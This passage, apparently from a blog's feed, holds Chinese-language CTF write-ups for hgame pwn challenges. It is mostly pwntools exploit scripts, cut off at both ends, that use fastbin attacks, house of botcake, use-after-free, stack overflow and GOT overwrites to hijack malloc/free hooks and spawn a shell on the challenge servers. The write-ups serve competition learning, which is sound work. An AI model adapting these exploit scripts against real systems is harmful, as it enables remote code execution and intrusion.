class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> temp:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-built_in">print</span>(temp)<br><br>            p.interactive()<br><br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">except</span> EOFError:<br>            p.close()<br>            <span class="hljs-keyword">continue</span><br><br></code></pre></td></tr></table></figure><p>本地可以打通，但是远程没有打通。</p><p><img src="/img/2022-hgame-week2/image-20230206232356089.png" alt="image-20230206232356089"></p><h2 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h2><p><code>fastbin attack</code>，覆盖malloc_hook为one_gadget，并使用realloc hook调整栈帧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><br>cli_script()<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30821</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span>)<br><br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">3</span>)<br><br>malloc_hook = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">88</span> - <span class="hljs-number">0x10</span><br>log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>realloc_hook = malloc_hook - <span class="hljs-number">0x8</span><br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br><br>gadgets = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf03a4</span>, <span class="hljs-number">0xf1247</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">3</span>]<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>, p64(malloc_hook - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">0x60</span> , <span class="hljs-string">&#x27;a&#x27;</span>)<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x13</span> - <span class="hljs-number">0x8</span>) + p64(one_gadget) + p64(realloc + <span class="hljs-number">7</span>))<br><br>menu(<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">9</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x20</span>))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a>new_fast_note</h2><p><code>house of botcake</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30472</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size, content</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">7</span>)<br><br>show(<span class="hljs-number">8</span>)<br><br>malloc_hook = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>gadgets = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">1</span>]<br><br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>delete(<span class="hljs-number">8</span>)<br><br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + p64(malloc_hook)<br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x60</span>, payload)<br><br>add(<span class="hljs-number">13</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;l1s00t&#x27;</span>)<br>add(<span class="hljs-number">14</span>, <span class="hljs-number">0x80</span>, p64(one_gadget))<br><br>menu(<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">9</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x20</span>))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h2><p>libc2.31 UAF漏洞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">31905</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x80</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">0</span>)<br>    edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br><br>leak = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br><br>malloc_hook = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>gadgets = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">0</span>]<br><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x60</span>)<br><br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">2</span>, p64(free_hook) + p64(<span class="hljs-number">0</span>))<br><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>)<br><br>edit(<span class="hljs-number">5</span>, p64(system))<br>edit(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>delete(<span class="hljs-number">4</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-hgame-week1</title>
    <link href="/2023/02/06/2022-hgame-week1/"/>
    <url>/2023/02/06/2022-hgame-week1/</url>
    
    <content type="html"><![CDATA[<h1 id="hgame-week1-pwn-wp"><a href="#hgame-week1-pwn-wp" class="headerlink" title="hgame week1-pwn wp"></a>hgame week1-pwn wp</h1><h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>直接nc即可。</p><h2 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30487</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>backdoor = <span class="hljs-number">0x40117E</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(backdoor)<br>p.sendline(payload)<br><br>p.sendline(<span class="hljs-string">&#x27;exec 1&gt;&amp;2&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h2><p>覆盖exit_got为main，泄漏puts地址，最后覆盖puts_got为system。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">31094</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>main = <span class="hljs-number">0x4012d1</span><br>exit_plt = <span class="hljs-number">0x4010e0</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;please choose one.&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-6&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;input your name&#x27;</span>)<br>payload = p64(main) + p64(<span class="hljs-number">0</span>)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;please choose one.&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-9&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;input your name&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br><br>puts = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;puts: &#x27;</span> + <span class="hljs-built_in">hex</span>(puts))<br><br>libc_base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;please choose one.&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-9&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;input your name&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(system))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>控制rbp或者rax即可实现对rsi的控制，进而read任一地址。</p><p><img src="/img/hgame-2022-week1/image-20230111114144304.png" alt="image-20230111114144304"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span 